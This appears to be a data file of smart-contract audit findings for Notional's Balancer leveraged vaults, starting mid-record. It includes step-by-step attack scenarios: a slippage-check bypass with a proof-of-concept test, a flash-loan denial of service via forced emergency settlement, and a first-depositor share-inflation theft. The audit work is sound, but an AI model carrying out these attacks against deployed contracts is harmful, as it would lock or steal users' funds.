Notional.\nhttps://github.com/sherlock-audit/2022-09-notional/blob/main/leveraged-vaults/scripts/BalancerEnvironment.py#L43\n```\nFile: BalancerEnvironment.py\n            ""postMaturitySettlementSlippageLimitPercent"": 10e6, # 10%\n            ""emergencySettlementSlippageLimitPercent"": 10e6, # 10%\n```\n\nWhen a user calls the `settleVaultEmergency` function, the vault will validate that the slippage (DynamicTradeParams.oracleSlippagePercent) defined by the caller is within the acceptable slippage range by calling `SettlementUtils._decodeParamsAndValidate` function.\nThe `SettlementUtils._decodeParamsAndValidate` function will validate that the slippage (DynamicTradeParams.oracleSlippagePercent) passed in by the caller does not exceed the designated threshold (10%). In Line 41-42, the transaction will revert if the `DynamicTradeParams.oracleSlippagePercent` exceeds the `slippageLimitPercent`. Note that `slippageLimitPercent` is equal to `emergencySettlementSlippageLimitPercent` which is `10%`.\nThere is an edge case with the condition at Line 41. Consider the following cases:\nIf `callbackData.oracleSlippagePercent` = 9% and `slippageLimitPercent` = 10%, the condition will evaluate as `False` and transaction will not revert\nIf `callbackData.oracleSlippagePercent` = 11% and `slippageLimitPercent` = 10%, the condition will evaluate as `True` and transaction will revert because it exceeds the designated threshold.\nIf `callbackData.oracleSlippagePercent` = 0% and `slippageLimitPercent` = 10%, the condition will evaluate as `False` and transaction will not revert\nThe problem is that when `callbackData.oracleSlippagePercent` is `0%`, this effectively means that there is no slippage limit. This essentially exceeded the designated threshold (10%), and the transaction should revert instead, but it did not.\nWithin `executeTradeWithDynamicSlippage` function, it will calculate the `trade.limit` by calling the `PROXY.getLimitAmount`. The `trade.limit` is the maximum amount of sellToken that can be sold OR the minimum amount of buyToken the contract is expected to receive from the DEX depending on whether you are performing a sell or buy.\nWithin the `TradingUtils._getLimitAmount` function, when the `slippageLimit` is set to `0`,\nIf it is a sell trade, the `limitAmount` will be set to `type(uint256).max`. See Line 187\nIf it is a buy trade, the `limitAmount` will be set to `0`. See Line 207\nThese effectively remove the slippage limit. Therefore, a malicious user can specify the `callbackData.oracleSlippagePercent` to be `0%` to bypass the slippage validation check.\nProof-of-Concept\nThe following test case shows that when the slippage is set to 11% (11e6), the transaction will be reverted and fails the test. This is working as intended because the slippage (11%) exceeded the threshold (emergencySettlementSlippageLimitPercent = 10%).\n```\ndef test_emergency_single_maturity_success(StratBoostedPoolUSDCPrimary):\n    (env, vault) = StratBoostedPoolUSDCPrimary\n    primaryBorrowAmount = 5000e8\n    depositAmount = 10000e6\n    env.tokens[""USDC""].approve(env.notional, 2 ** 256 - 1, {""from"": env.whales[""USDC""]})\n    maturity = enterMaturity(env, vault, 2, 0, depositAmount, primaryBorrowAmount, env.whales[""USDC""])\n    strategyContext = vault.getStrategyContext()\n    settings = dict(strategyContext[""baseStrategy""][""vaultSettings""].dict())\n    settings[""maxBalancerPoolShare""] = 0\n    vault.setStrategyVaultSettings(\n        list(settings.values()), \n        {""from"": env.notional.owner()}\n    )\n    # minPrimary is calculated internally for boosted pools \n    redeemParams = get_redeem_params(0, 0, \n        get_dynamic_trade_params(\n            DEX_ID[""UNISWAP_V3""], TRADE_TYPE[""EXACT_IN_SINGLE""], 11e6, True, get_univ3_single_data(3000)\n        )\n    )\n    vault.settleVaultEmergency(maturity, redeemParams, {""from"": env.notional.owner()})\n    vaultState = env.notional.getVaultState(vault.address, maturity)\n    assert vaultState[""totalStrategyTokens""] == 0\n```\n\n```\n❯ brownie test tests/balancer/settlement/test_settlement_boosted_usdc.py --network mainnet-fork\nBrownie v1.18.1 - Python development framework for Ethereum\n\n=============================================================================================== test session starts ===============================================================================================\nplatform linux -- Python 3.8.10, pytest-6.2.5, py-1.11.0, pluggy-1.0.0\nplugins: eth-brownie-1.18.1, hypothesis-6.27.3, forked-1.4.0, xdist-1.34.0, web3-5.27.0\ncollected 1 item                                                                                                                                                                                                  \nAttached to local RPC client listening at '127.0.0.1:8545'// rest of code\n\ntests/balancer/settlement/test_settlement_boosted_usdc.py F                                                                                                                                                 [100%]\n\n==================================================================================================== FAILURES =====================================================================================================\n```\n\nThe following test case shows that when the slippage is set to 0, the transaction does not revert and passes the test. This is not working as intended because having no slippage (0) technically exceeded the threshold (emergencySettlementSlippageLimitPercent = 10%).\n```\ndef test_emergency_single_maturity_success(StratBoostedPoolUSDCPrimary):\n    (env, vault) = StratBoostedPoolUSDCPrimary\n    primaryBorrowAmount = 5000e8\n    depositAmount = 10000e6\n    env.tokens[""USDC""].approve(env.notional, 2 ** 256 - 1, {""from"": env.whales[""USDC""]})\n    maturity = enterMaturity(env, vault, 2, 0, depositAmount, primaryBorrowAmount, env.whales[""USDC""])\n    strategyContext = vault.getStrategyContext()\n    settings = dict(strategyContext[""baseStrategy""][""vaultSettings""].dict())\n    settings[""maxBalancerPoolShare""] = 0\n    vault.setStrategyVaultSettings(\n        list(settings.values()), \n        {""from"": env.notional.owner()}\n    )\n    # minPrimary is calculated internally for boosted pools \n    redeemParams = get_redeem_params(0, 0, \n        get_dynamic_trade_params(\n            DEX_ID[""UNISWAP_V3""], TRADE_TYPE[""EXACT_IN_SINGLE""], 0, True, get_univ3_single_data(3000)\n        )\n    )\n    vault.settleVaultEmergency(maturity, redeemParams, {""from"": env.notional.owner()})\n    vaultState = env.notional.getVaultState(vault.address, maturity)\n    assert vaultState[""totalStrategyTokens""] == 0\n```\n\n```\n❯ brownie test tests/balancer/settlement/test_settlement_boosted_usdc.py --network mainnet-fork\nBrownie v1.18.1 - Python development framework for Ethereum\n\n=============================================================================================== test session starts ===============================================================================================\nplatform linux -- Python 3.8.10, pytest-6.2.5, py-1.11.0, pluggy-1.0.0\nplugins: eth-brownie-1.18.1, hypothesis-6.27.3, forked-1.4.0, xdist-1.34.0, web3-5.27.0\ncollected 1 item                                                                                                                                                                                                  \nAttached to local RPC client listening at '127.0.0.1:8545'// rest of code\n\ntests/balancer/settlement/test_settlement_boosted_usdc.py .                                                                                                                                                 [100%]\n\n========================================================================================== 1 passed, 1 warning in 4.31s ===========================================================================================\n```\n"ч"
Attackers Can DOS Balancer Vaults By Bypassing The BPT Thresholdчmediumч"```\nFile: BalancerEnvironment.py\n            ""oracleWindowInSeconds"": 3600,\n            ""maxBalancerPoolShare"": 2e3, # 20%\n            ""settlementSlippageLimitPercent"": 5e6, # 5%\n```\n"ч"Malicious users can lock up all the leverage vaults offered by Notional causing denial-of-service by bypassing the BPT threshold and subseqently trigger an emergency settlement against the vaults.\nThe current BPT threshold is set to 20% of the total BTP supply based on the environment file provided during the audit.\nhttps://github.com/sherlock-audit/2022-09-notional/blob/main/leveraged-vaults/scripts/BalancerEnvironment.py#L41\n```\nFile: BalancerEnvironment.py\n            ""oracleWindowInSeconds"": 3600,\n            ""maxBalancerPoolShare"": 2e3, # 20%\n            ""settlementSlippageLimitPercent"": 5e6, # 5%\n```\n\nWhen the total number of BPT owned by the vault exceeds the BPT threshold, no one will be able to enter the vault as per the require check at Line 295-296 within the `TwoTokenPoolUtils._joinPoolAndStake` function.\nAnother key point that is critical for this issue is that when the total number of BPT owned by the vault exceeds the BPT threshold, an emergency settlement can be triggered against the vault and anyone can triggered it as it is permissionless. A major side-effect of an emergency settlement is that the vault will be locked up after the emergency settlement. No one is allowed to enter the vault and users are only allowed to exit from the vault by taking their proportional share of cash and strategy tokens. The reason is that after the emergency settlement, there will be some asset cash balance in the vault and this will cause no one to be able to enter the vault due to the require check at Line 218. This side-effect has been verified by reviewing the codebase and clarifying with the sponsors.\nIf an attacker could force an emergency settlement on a vault anytime, he would be able to perform a DOS on the vault since the vault will basically be locked up after it. The following demonstrates how this can be performed:\nAssume that the total supply of BTP in the WETH/stETH Balancer Pool is 100,000 Therefore, the BPT threshold of the vault will be 20,000.\nAssume that the total number of BPT held by the vault is 19,900.\nNote that under normal circumstances, it is not possible for the users to exceed the BPT threshold because the transaction will revert if the `bptHeldAfterJoin > bptThreshold` after the user enters the vault.\nNote that at this point, the emergency settlement CANNOT be triggered against the vault because the vault has not exceeded BPT threshold yet\nBob (attacker) flash-loans a large amount of ETH from dydx where the fee is almost non-existence (1 Wei Only)\nBob allocates a portion of his ETH to join the WETH/stETH Balancer Pool. This will cause the total supply of BPT to increase significantly to 200,000.\nBob allocates a portion of his ETH to enter the vault and causes the total number of BPT held by the vault to increase by 150 from 19,900 to 20,050. This is allowed because the total supply of BPT has increased to 200,000, and thus the BPT threshold has increased to 40,000. Also, Bob does not leverage himself and does not borrow from Notional since the flash loan already provided him with access to a large number of funds, and thus he does not need to pay for any borrowing cost to minimize the cost of this attack.\nAt this point, due to the inflow of 150 BPT to the Balancer Pool, the total supply of BPT increase from 200,000 to 200,150.\nAfter entering the vault, Bob exits the WETH/stETH Balancer Pool entirely with all his 100,000 BPT position. This will cause the total supply of BPT to fall back to 100,150. Per my research, there is no exit fee when a Liquidity Provider exits a pool. Also, a Liquidity Provider only suffers a loss due to impermanent loss. However, since all these steps are executed within the same transaction, there is no impermanent loss because no one perform any token swap. Thus, there is no cost incurred by Bob for this step.\nNote that at this point, the emergency settlement CAN be triggered against the vault because the vault has exceeded the BPT threshold. The total number of BPT held by the vault is 20,050, and the BPT threshold is 20,030 (=100,150 * 0.2).\nAnyone can trigger the emergency settlement as it is permissionless. Bob triggered an emergency settlement against the vault, and 20 BPT will be sold off in the market so that the vault will not exceed the BPT threshold. It is important to ensure that the number of BPTs to be sold is kept as low as possible so that the total value of the vault will not be reduced by slippage during the trade. This is because Bob still owns the shares of the vault and he wants to get back as much of his original deposit as possible later. This value can be optimized further with Math.\nAs mentioned earlier, after an emergency settlement, the vault will be locked up. No one is allowed to enter the vault and users are only allowed to exit from the vault by taking their proportional share of cash and strategy tokens.\nBob proceeds to redeem all his shares from the vault. He will get back all of his deposits minus the 20 BPT slippage loss during the emergency settlement that is split proportionally among all vault shareholders which is insignificant. Note that the Notional's leverage vault does not impose any exit fee.\nBob proceeds to repay back his loan and pay 1 wei as the fee to dydx.\nThe cost of attack is 1 wei (flash-loan fee) + 20 BPT slippage loss during the emergency settlement that is split proportionally among all vault shareholders, which is insignificant. The slippage loss during emergency settlement can be minimized by causing the total number of BPT held by the vault to exceed the BPT threshold by the smallest possible value.\nAll the above steps will be executed within a single block/transaction."ч
Corruptible Upgradability Patternчmediumч```\ngraph BT;\n classDef nogap fill:#f96;\n classDef hasgap fill:#99cc00;\n    MetaStable2TokenAuraVault-->MetaStable2TokenVaultMixin:::nogap\n    MetaStable2TokenVaultMixin:::nogap-->TwoTokenPoolMixin:::nogap\n    MetaStable2TokenVaultMixin:::nogap-->BalancerOracleMixin:::nogap\n    TwoTokenPoolMixin:::nogap-->PoolMixin:::nogap\n    PoolMixin:::nogap-->AuraStakingMixin:::nogap\n    PoolMixin:::nogap-->BalancerStrategyBase;\n    BalancerStrategyBase:::hasgap-->BaseStrategyVault:::hasgap\n    BalancerStrategyBase:::hasgap-->UUPSUpgradeable\n```\nчStorage of Boosted3TokenAuraVault and MetaStable2TokenAuraVault vaults might be corrupted during an upgrade.\nFollowing are the inheritance of the Boosted3TokenAuraVault and MetaStable2TokenAuraVault vaults.\nNote: The contracts highlighted in Orange mean that there are no gap slots defined. The contracts highlighted in Green mean that gap slots have been defined\nInheritance of the MetaStable2TokenAuraVault vault\n```\ngraph BT;\n classDef nogap fill:#f96;\n classDef hasgap fill:#99cc00;\n    MetaStable2TokenAuraVault-->MetaStable2TokenVaultMixin:::nogap\n    MetaStable2TokenVaultMixin:::nogap-->TwoTokenPoolMixin:::nogap\n    MetaStable2TokenVaultMixin:::nogap-->BalancerOracleMixin:::nogap\n    TwoTokenPoolMixin:::nogap-->PoolMixin:::nogap\n    PoolMixin:::nogap-->AuraStakingMixin:::nogap\n    PoolMixin:::nogap-->BalancerStrategyBase;\n    BalancerStrategyBase:::hasgap-->BaseStrategyVault:::hasgap\n    BalancerStrategyBase:::hasgap-->UUPSUpgradeable\n```\n\nInheritance of the Boosted3TokenAuraVault vault\n```\ngraph BT;\n classDef nogap fill:#f96;\n classDef hasgap fill:#99cc00;\n    Boosted3TokenAuraVault-->Boosted3TokenPoolMixin:::nogap\n    Boosted3TokenPoolMixin:::nogap-->PoolMixin:::nogap\n    PoolMixin:::nogap-->BalancerStrategyBase\n    PoolMixin:::nogap-->AuraStakingMixin:::nogap\n    BalancerStrategyBase:::hasgap-->BaseStrategyVault:::hasgap\n    BalancerStrategyBase:::hasgap-->UUPSUpgradeable\n```\n\nThe Boosted3TokenAuraVault and MetaStable2TokenAuraVault vaults are meant to be upgradeable. However, it inherits contracts that are not upgrade-safe.\nThe gap storage has been implemented on the `BaseStrategyVault` and `BalancerStrategyBase` contracts inherited by the Boosted3TokenAuraVault and MetaStable2TokenAuraVault vaults.\n```\nabstract contract BaseStrategyVault is Initializable, IStrategyVault {\n    using TokenUtils for IERC20;\n    using TradeHandler for Trade;\n    ..SNIP..\n    // Storage gap for future potential upgrades\n    uint256[45] private __gap;\n}\n```\n\n```\nabstract contract BalancerStrategyBase is BaseStrategyVault, UUPSUpgradeable {\n    /** Immutables */\n    uint32 internal immutable SETTLEMENT_PERIOD_IN_SECONDS;\n    ..SNIP..\n    // Storage gap for future potential upgrades\n    uint256[100] private __gap;\n}\n```\n\nHowever, no gap storage is implemented on the `Boosted3TokenPoolMixin`, `MetaStable2TokenVaultMixin`, `TwoTokenPoolMixin`, `PoolMixin`, `AuraStakingMixin` and `BalancerOracleMixin` contracts inherited by the Boosted3TokenAuraVault and MetaStable2TokenAuraVault vaults.\nThus, adding new storage variables to any of these inherited contracts can potentially overwrite the beginning of the storage layout of the child contract. causing critical misbehaviors in the system.чConsider defining an appropriate storage gap in each upgradeable parent contract at the end of all the storage variable definitions as follows:\n```\nuint256[50] __gap; // gap to reserve storage in the contract for future variable additions\n```\n\nReference\nA similar issue was found in the past audit report:\nhttps://blog.openzeppelin.com/notional-audit/ - [M02] Adding new variables to multi-level inherited upgradeable contracts may break storage layout\nDiscussion\njeffywu\n@weitianjie2000чStorage of Boosted3TokenAuraVault and MetaStable2TokenAuraVault vaults might be corrupted during upgrading, thus causing the vaults to be broken and assets to be stuck.\nCode Snippet\nTool used\nManual Review
Vault Share/Strategy Token Calculation Can Be Broken By First User/Attackerчmediumч```\nstrategyToken = (totalBPTHeld == 0) ?  bptClaim : (bptClaim * totalStrategyToken) / totalBPTHeld\n```\nч"A well-known attack vector for almost all shares-based liquidity pool contracts, where an early user can manipulate the price per share and profit from late users' deposits because of the precision loss caused by the rather large value of price per share.\nNote: This issue affects MetaStable2 and Boosted3 balancer leverage vaults\nFor simplicity's sake, we will simplify the `strategy token` minting formula as follows. Also, assume that the 1 `vault share` is equivalent to 1 `strategy token` for this particular strategy vault, therefore, we will use the term `vault share` and `strategy token` interchangeably here.\n```\nstrategyToken = (totalBPTHeld == 0) ?  bptClaim : (bptClaim * totalStrategyToken) / totalBPTHeld\n```\n\nThe vault minting formula is taken from the following:\nIf the attacker who is the first depositor claims 1 BPT, he will receive 1 Strategy Token. So 1 BPT per Strategy Token. At this point in time, `totalBPTHeld = 1` and `totalStrategyToken = 1`.\nThe attacker obtains 9999 BPT can be obtained from the open market. He proceeds to deposit the 9999 BPT into the Aura reward pool on behalf of the vault. At this point in time, `totalBPTHeld = 10000` and `totalStrategyToken = 1`. So 10000 BPT per Strategy Token. Refer to the ""How to increase the total BPT held?"" section below for more details.\nTwo issues can occur from here.\nIssue 1 - If bptClaim >= totalBPTHeld\nThe following describes a scenario in which a user's assets are lost and stolen by an attacker. Assume that Alice deposits/borrow some assets and received 19999 BPT. Based on the formula, Alice will only receive 1 Strategy Token. She immediately loses 9999 BPT or half of her assets if she exits the vault or redeems the strategy tokens right after the deposit.\n```\nstrategyToken = (bptClaim * totalStrategyToken) / totalBPTHeld\nstrategyToken = (19999 * 1) / 10000 = 1\n```\n\nIf the attacker exits the vault right after Alice's deposit, the attacker will receive 14999 BPT. He profited 4999 BPT from this attack\n```\nbptReceived = (strategyToken * totalBPTHeld) / totalStrategyToken\nbptReceived = (1 * 29999) / 2 = 14999\n```\n\nIssue 2 - If bptClaim < totalBPTHeld\nThe following describes a scenario in which a user's assets are lost entirely. Assume that Alice deposits/borrow some assets and received 9999 BPT\n```\nstrategyToken = (bptClaim * totalStrategyToken) / totalBPTHeld\nstrategyToken = (9999  * 1) / 10000 = 0\n```\n\nAs such, she deposited 9999 BPT but did not receive any strategy tokens in return.\nHow to increase the total BPT held?\nUnlike the vault design seen in other protocols, Notional's leverage vault does not compute the total BPT held by the vault directly via `BTP.balanceOf(address(vault))`. The vault deposit its BPT to the Aura Reward Pool. Therefore, it is not possible to increase the total BPT held by the vault simply by performing a direct BPT token transfer to the vault or Aura Reward Pool in an attempt to increase it.\nHowever, there is a workaround to increase the total BPT held by the vault, and this can be executed by anyone.\nThe `totalBPTHeld` within the vault is obtained by calling the `PoolMixin._bptHeld` function.\nWithin the `PoolMixin._bptHeld` function, it will call the `AURA_REWARD_POOL.balanceOf(address(this))` to retrieve the number of BPT that the vault has deposited into the Aura Reward Pool.\nThe following is the contract of the AURA_REWARD_POOL taken from the Etherscan. Note that the `AURA_REWARD_POOL.balanceOf` will retrieve the number of BPT tokens held by an account. In this example, the account will be the vault's address.\nhttps://etherscan.io/address/0xdcee1c640cc270121faf145f231fd8ff1d8d5cd4#code\nTo increase the balance, the `deposit(uint256 _pid, uint256 _amount, bool _stake)` function of Aura's Booster contract can be called. However, the problem is that this function will deposit to the `msg.sender` and there is no way to spoof the vault's address. Thus, using this function will not work.\nHowever, there is a second method that can be used to perform a deposit. The `AURA_REWARD_POOL` point to the `BaseRewardPool4626`, thus the reward pool is an ERC4626 vault. The Aura's ERC4626 vault supports an alternative deposit function called `BaseRewardPool4626.deposit` that allows anyone to deposit on behalf of another account. An attacker can leverage the `BaseRewardPool4626.deposit` function by specifying the `receiver` parameter to be the `vault.address` in an attempt to increase the total BPT tokens held by the vault.\nhttps://etherscan.io/address/0xdcee1c640cc270121faf145f231fd8ff1d8d5cd4#code\nCode Snippet\nTool used\nManual Review"ч
`CrossCurrencyfCashVault` Cannot Be Upgradedчmediumч```\nabstract contract BaseStrategyVault is Initializable, IStrategyVault {\n    using TokenUtils for IERC20;\n    using TradeHandler for Trade;\n\n    /// @notice Hardcoded on the implementation contract during deployment\n    NotionalProxy public immutable NOTIONAL;\n    ITradingModule public immutable TRADING_MODULE;\n    uint8 constant internal INTERNAL_TOKEN_DECIMALS = 8;\n    \n    ..SNIP..\n    \n    // Storage gap for future potential upgrades\n    uint256[45] private __gap;\n }\n```\nч`CrossCurrencyfCashVault` cannot be upgraded as it is missing the authorize upgrade method.\nThe Cross Currency Vault is expected to be upgradeable as:\nThis vault is similar to the other vaults (Boosted3TokenAuraVault and MetaStable2TokenAuraVault) provided by Notional that are upgradeable by default.\nThe `BaseStrategyVault` has configured the storage gaps `uint256[45] private __gap` for upgrading purposes\nClarified with the sponsor and noted that Cross Currency Vault should be upgradeable\n`CrossCurrencyfCashVault` inherits from `BaseStrategyVault`. However, the `BaseStrategyVault` forget to inherit Openzepplin's `UUPSUpgradeable` contract. Therefore, it is missing the authorize upgrade method, and the contract cannot be upgraded.\n```\nabstract contract BaseStrategyVault is Initializable, IStrategyVault {\n    using TokenUtils for IERC20;\n    using TradeHandler for Trade;\n\n    /// @notice Hardcoded on the implementation contract during deployment\n    NotionalProxy public immutable NOTIONAL;\n    ITradingModule public immutable TRADING_MODULE;\n    uint8 constant internal INTERNAL_TOKEN_DECIMALS = 8;\n    \n    ..SNIP..\n    \n    // Storage gap for future potential upgrades\n    uint256[45] private __gap;\n }\n```\n\n```\ncontract CrossCurrencyfCashVault is BaseStrategyVault {\n    using TypeConvert for uint256;\n    using TypeConvert for int256;\n\n    uint256 public constant SETTLEMENT_SLIPPAGE_PRECISION = 1e18;\n\n    struct DepositParams {\n        // Minimum purchase amount of the lend underlying token, this is\n        // based on the deposit + borrowed amount and must be set to a non-zero\n        // value to establish a slippage limit.\n        uint256 minPurchaseAmount;\n        // Minimum annualized lending rate, can be set to zero for no slippage limit\n        uint32 minLendRate;\n        // ID of the desired DEX to trade on, _depositFromNotional will always trade\n        // using an EXACT_IN_SINGLE trade which is supported by all DEXes\n        uint16 dexId;\n        // Exchange data depending on the selected dexId\n        ..SNIP..\n```\nч
getGetAmplificationParameter() precision is not used, which result in accounting issue in MetaStable2TokenAuraHelper.sol and in Boosted3TokenAuraHelper.solчmediumч```\n    function reinvestReward(\n        MetaStable2TokenAuraStrategyContext calldata context,\n        ReinvestRewardParams calldata params\n    )\n```\nчThis report has two part,\nboth issue rooted in not handling the getGetAmplificationParameter() precision\nAccording to the Balancer documentation\nhttps://dev.balancer.fi/resources/pool-interfacing/stable-pool#amplification-parameter\npool.getGetAmplificationParameter()\nreturns something resembling\nvalue : 620000 isUpdating : False precision : 1000\nwhere the amplification parameter is 620000 / 1000 = 620\nbut in the code, the isUpdating and precision returned is ignored and not used.\nPart One\n```\n    function reinvestReward(\n        MetaStable2TokenAuraStrategyContext calldata context,\n        ReinvestRewardParams calldata params\n    )\n```\n\nIt calls\n```\n// Make sure we are joining with the right proportion to minimize slippage\n        oracleContext._validateSpotPriceAndPairPrice({\n            poolContext: poolContext,\n            strategyContext: strategyContext,\n            primaryAmount: primaryAmount,\n            secondaryAmount: secondaryAmount\n        });\n```\n\nthen it calls\n```\nuint256 spotPrice = _getSpotPrice(oracleContext, poolContext, 0);\n```\n\nthen it calls\nInsite the function\n```\n        (uint256 balanceX, uint256 balanceY) = tokenIndex == 0 ?\n            (poolContext.primaryBalance, poolContext.secondaryBalance) :\n            (poolContext.secondaryBalance, poolContext.primaryBalance);\n\n        uint256 invariant = StableMath._calculateInvariant(\n            oracleContext.ampParam, StableMath._balances(balanceX, balanceY), true // round up\n        );\n\n        spotPrice = StableMath._calcSpotPrice({\n            amplificationParameter: oracleContext.ampParam,\n            invariant: invariant,\n            balanceX: balanceX,\n            balanceY: balanceY\n        });\n```\n\nWhat's wrong with this, I believe the precision has issue for ampParam\nWe did not use the precision returned from the pool\n```\n      (\n            uint256 value,\n            /* bool isUpdating */,\n            /* uint256 precision */\n        ) = IMetaStablePool(address(BALANCER_POOL_TOKEN)).getAmplificationParameter();\n```\n\nAccording to the Balancer documentation\nhttps://dev.balancer.fi/resources/pool-interfacing/stable-pool#amplification-parameter\npool.getGetAmplificationParameter()\nreturns something resembling\nvalue : 620000 isUpdating : False precision : 1000\nwhere the amplification parameter is 620000 / 1000 = 620\nThe formula that calculate the spot price is\n```\n   /**************************************************************************************************************\n    //                                                                                                           //\n    //                             2.a.x.y + a.y^2 + b.y                                                         //\n    // spot price Y/X = - dx/dy = -----------------------                                                        //\n    //                             2.a.x.y + a.x^2 + b.x                                                         //\n    //                                                                                                           //\n    // n = 2                                                                                                     //\n    // a = amp param * n                                                                                         //\n    // b = D + a.(S - D)                                                                                         //\n    // D = invariant                                                                                             //\n    // S = sum of balances but x,y = 0 since x  and y are the only tokens                                        //\n    **************************************************************************************************************/\n```\n\nthe function _calcSpotPrice hardcode the amp precision to 1e3;\n```\n   uint256 internal constant _AMP_PRECISION = 1e3;\n```\n\nand implement\n```\nuint256 a = (amplificationParameter * 2) / _AMP_PRECISION;\n```\n\nif the pool's ampParameter is not equal to _AMP_PRECISION, the math will break.\nPart Two\n```\n    function reinvestReward(\n        Boosted3TokenAuraStrategyContext calldata context,\n        ReinvestRewardParams calldata params\n    ) \n```\n\nThen we call\n```\n   uint256 minBPT = context.poolContext._getMinBPT(\n      oracleContext, strategyContext, primaryAmount\n   );\n```\n\nthen we call\n```\n minBPT = StableMath._calcBptOutGivenExactTokensIn({\n  amp: oracleContext.ampParam,\n  balances: balances,\n  amountsIn: amountsIn,\n  bptTotalSupply: virtualSupply,\n  swapFeePercentage: 0,\n  currentInvariant: invariant\n });\n```\n\nthen we call\n```\n // Get current and new invariants, taking swap fees into account\n uint256 newInvariant = _calculateInvariant(amp, newBalances, false);\n uint256 invariantRatio = newInvariant.divDown(currentInvariant);\n```\n\nthen we call\n```\n  uint256 ampTimesTotal = amplificationParameter * numTokens;\n```\n\nwe just use the amplificationParameter without handling the precision.\n```\n (\n  uint256 value,\n  /* bool isUpdating */,\n  /* uint256 precision */\n ) = pool.getAmplificationParameter();\n```\n\nthe isUpdating and precision is not used,\nhowever, according to the documentation\nAccording to the Balancer documentation\nhttps://dev.balancer.fi/resources/pool-interfacing/stable-pool#amplification-parameter\npool.getGetAmplificationParameter()\nreturns something resembling\nvalue : 620000 isUpdating : False precision : 1000\nwhere the amplification parameter is 620000 / 1000 = 620чSource: https://github.com/sherlock-audit/2022-09-notional-judging/issues/124\nFound by\nctf_sec\nWe recommend the project use the precision returned from getGetAmplificationParameter()\n```\n      (\n            uint256 value,\n            bool isUpdating */,\n            uint256 precision */\n        ) = IMetaStablePool(address(BALANCER_POOL_TOKEN)).getAmplificationParameter();\n        return value / precision;\n```\n\nDiscussion\njeffywu\n@weitianjie2000, although I do believe in the meta stable vaults the AMP precision is hardcoded to 1e3 in practice. We should go with the value that is returned from the method.чThe amplificationParameter has precision, ignoring the precision will result in accounting issue.\nIf the precision of the amplificationParameter is not equal to hardcoded 1e3, the spot price is invalid.\nthe code\n```\n   uint256 ampTimesTotal = amplificationParameter * numTokens;\n```\n\nwill be overvalued because we did not divide the value by the precision.\nCode Snippet\nFor part one\nFor part two\nTool used\nManual Review
stakingContext.auraRewardPool.withdrawAndUnwrap boolean return value not handled in Boosted3TokenPoolUtils.sol and TwoTokenPoolUtils.solчmediumч```\nstakingContext.auraRewardPool.withdrawAndUnwrap(bptClaim, false);\n```\nчWhen calling function _unstakeAndExitPool,\nthe contract withdraw BPT tokens back to the vault for redemption\nby calling\n```\nstakingContext.auraRewardPool.withdrawAndUnwrap(bptClaim, false);\n```\n\nhowever, the underlying call withdrawAndUnwrap returns boolean value, the contract does not handle the return value.\nThe see the interface of the IAuraRewardPool already indicate that the underlying call returns value\n```\ninterface IAuraRewardPool {\n    function withdrawAndUnwrap(uint256 amount, bool claim) external returns(bool);\n```\n\n```\n    function withdrawAndUnwrap(uint256 amount, bool claim) public updateReward(msg.sender) returns(bool){\n```\nчWe recommend the project handle the return value when unstaking explicitly\n```\nbool unstaked = stakingContext.auraRewardPool.withdrawAndUnwrap(bptClaim, false);\nrequire(unstaked, 'unstake failed');\n```\n\nDiscussion\njeffywu\n@weitianjie2000чBecause there are stacks of external call:\nNotional -> auraRewardPool -> BaseRewardPool,\nwithout handling the return value explicitly, the transaction may risk fails silently.\nCode Snippet\nTool used\nManual Review
stakingContext.auraBooster.deposit boolean return value not handled in Boosted3TokenPoolUtils.solчmediumч```\n        // Transfer token to Aura protocol for boosted staking\n        stakingContext.auraBooster.deposit(stakingContext.auraPoolId, bptMinted, true); // stake = true\n```\nч"However, when entering the stake and interacting with external contract, the logic does not handle the returned boolean value in the code below\n```\n        // Transfer token to Aura protocol for boosted staking\n        stakingContext.auraBooster.deposit(stakingContext.auraPoolId, bptMinted, true); // stake = true\n```\n\nIn the AuraBooster implmenetation, a Boolean is indeed returned to acknowledge that deposit is completely successfully.\nhttps://etherscan.io/address/0x7818A1DA7BD1E64c199029E86Ba244a9798eEE10#code#F34#L1\n```\n    /**\n     * @notice  Deposits an ""_amount"" to a given gauge (specified by _pid), mints a `DepositToken`\n     *          and subsequently stakes that on Convex BaseRewardPool\n     */\n    function deposit(uint256 _pid, uint256 _amount, bool _stake) public returns(bool){\n```\n"чWe recommend the project handle the stakingContext.auraBooster.deposit boolean return value explicitly.\n```\n  // Transfer token to Aura protocol for boosted staking\n    bool staked = stakingContext.auraBooster.deposit(stakingContext.auraPoolId, bptMinted, true); // stake = true\n    require(staked, 'stake failed');\n```\n\nDiscussion\njeffywu\n@weitianjie2000чNotional -> AuraBooster -> BaseRewardPool\nWithout handling the boolean value explitily, there is risk that transaction may be fail sliently.\nBecause there are two layers of external call\nCode Snippet\nTool used\nManual Review
`deleverageAccount` can be used by an address to enter a vault that would otherwise be restricted by the `requireValidAccount` check in `enterVault`чmediumч```\nrequire(account != Constants.RESERVE); // Reserve address is address(0)\nrequire(account != address(this));\n(\n    uint256 isNToken,\n    /* incentiveAnnualEmissionRate */,\n    /* lastInitializedTime */,\n    /* assetArrayLength */,\n    /* parameters */\n) = nTokenHandler.getNTokenContext(account);\nrequire(isNToken == 0);\n```\nч`deleverageAccount` can be used by an address to enter a vault that would otherwise be restricted by the `requireValidAccount` check in `enterVault`\n```\nrequire(account != Constants.RESERVE); // Reserve address is address(0)\nrequire(account != address(this));\n(\n    uint256 isNToken,\n    /* incentiveAnnualEmissionRate */,\n    /* lastInitializedTime */,\n    /* assetArrayLength */,\n    /* parameters */\n) = nTokenHandler.getNTokenContext(account);\nrequire(isNToken == 0);\n```\nч"
When one of the plugins is broken or paused, `deposit()` or `withdraw()` of the whole Vault contract can malfunctionчmediumч```\n  modifier whenNotPaused() {\n    _whenNotPaused();\n    _;\n  }\n```\nчOne malfunctioning plugin can result in the whole Vault contract malfunctioning.\nA given plugin can temporally or even permanently becomes malfunctioning (cannot deposit/withdraw) for all sorts of reasons.\nEg, Aave V2 Lending Pool can be paused, which will prevent multiple core functions that the Aave v2 plugin depends on from working, including `lendingPool.deposit()` and `lendingPool.withdraw()`.\n```\n  modifier whenNotPaused() {\n    _whenNotPaused();\n    _;\n  }\n```\n\n```\n  function withdraw(\n    address asset,\n    uint256 amount,\n    address to\n  ) external override whenNotPaused returns (uint256) {\n```\n\nThat's because the deposit will always goes to the first plugin, and withdraw from the last plugin first.ч
